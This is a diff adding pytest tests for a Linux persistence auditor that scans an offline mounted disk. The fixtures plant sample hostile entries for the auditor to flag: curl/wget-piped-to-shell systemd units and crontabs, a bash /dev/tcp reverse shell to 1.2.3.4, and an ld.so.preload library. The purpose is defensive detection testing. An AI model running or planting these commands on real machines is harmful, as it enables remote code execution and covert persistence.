@@ -190,3 +190,94 @@ def test_fix_never_deletes_and_prefers_disabling(tmp_path):
     text = " ".join(a.description for a in fix.actions)
     assert "disable" in text
     assert "cannot be examined" in text
+
+
+# ---------------- offline: a Linux disk mounted elsewhere ----------------
+
+from rescue.profiler.base import gather_target_profile  # noqa: E402
+
+_SUSP = "security.linux_persistence_audit.suspicious_content"
+
+
+def _offline(linux_disk):
+    return gather_target_profile(linux_disk, Platform.LINUX)
+
+
+def test_offline_finds_curl_pipe_sh_unit_on_target(linux_disk):
+    (linux_disk / "etc/systemd/system/updater.service").write_text(
+        "[Service]\nExecStart=/bin/sh -c 'curl http://x | sh'\n"
+    )
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and hit[0].data["path"] == "/etc/systemd/system/updater.service"
+    assert r.not_checked == []
+
+
+def test_offline_reads_unit_symlink_from_target_not_host(linux_disk):
+    (linux_disk / "lib/systemd/system/evil.service").write_text(
+        "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1'\n"
+    )
+    wants = linux_disk / "etc/systemd/system/multi-user.target.wants"
+    (wants / "evil.service").symlink_to("/lib/systemd/system/evil.service")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == _SUSP]
+    assert hit and hit[0].data["path"].endswith("evil.service")
+    assert "/dev/tcp" in hit[0].data["excerpt"]
+
+
+def test_offline_does_not_follow_directory_symlink_to_host(linux_disk, tmp_path):
+    host = tmp_path / "hostdir"
+    host.mkdir()
+    (host / "x.service").write_text("ExecStart=curl http://x | sh\n")
+    (linux_disk / "etc/systemd/system/escape").symlink_to(host)
+    r = _get_module().check(_offline(linux_disk))
+    assert not [f for f in r.findings if f.code == _SUSP]
+
+
+def test_offline_expands_tilde_for_every_target_user(linux_disk):
+    d = linux_disk / "home/sam/.config/autostart"
+    d.mkdir(parents=True)
+    (d / "x.desktop").write_text("[Desktop Entry]\nExec=/tmp/.x\n")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings
+           if f.code == "security.linux_persistence_audit.volatile_path_execution"]
+    assert hit and hit[0].data["path"] == "/home/sam/.config/autostart/x.desktop"
+
+
+def test_offline_reads_spool_crontabs_and_never_runs_crontab(linux_disk):
+    spool = linux_disk / "var/spool/cron/crontabs"
+    spool.mkdir(parents=True)
+    (spool / "sam").write_text("* * * * * wget -qO- http://x | bash\n")
+    mod = _get_module()
+    with patch.object(sys.modules[type(mod).__module__], "run",
+                      side_effect=AssertionError("no host commands offline")):
+        r = mod.check(_offline(linux_disk))
+    assert any(f.data.get("path") == "/var/spool/cron/crontabs/sam"
+               for f in r.findings if f.code == _SUSP)
+    inv = next(f for f in r.findings if f.data.get("check") == "inventory")
+    assert {"path": "/var/spool/cron/crontabs/sam", "kind": "user crontab"} in inv.data["entries"]
+
+
+def test_offline_ld_preload_read_from_target(linux_disk):
+    (linux_disk / "etc/ld.so.preload").write_text("/usr/lib/libevil.so\n")
+    r = _get_module().check(_offline(linux_disk))
+    hit = [f for f in r.findings if f.code == "security.linux_persistence_audit.ld_preload_set"]
+    assert hit and hit[0].data["path"] == "/etc/ld.so.preload"
+
+
+def test_offline_world_writable_unit(linux_disk):
+    p = linux_disk / "etc/systemd/system/loose.service"
+    p.write_text("[Service]\n")
+    p.chmod(0o666)
+    r = _get_module().check(_offline(linux_disk))
+    assert any(f.code == "security.linux_persistence_audit.world_writable_unit"
+               and f.data["path"] == "/etc/systemd/system/loose.service" for f in r.findings)
+
+
+def test_offline_ordinary_disk_has_no_warnings(linux_disk):
+    r = _get_module().check(_offline(linux_disk))
+    assert [f for f in r.findings if f.severity is not Severity.INFO] == []
+
+
+def test_offline_capable_flag():
+    assert _get_module().offline_capable is True
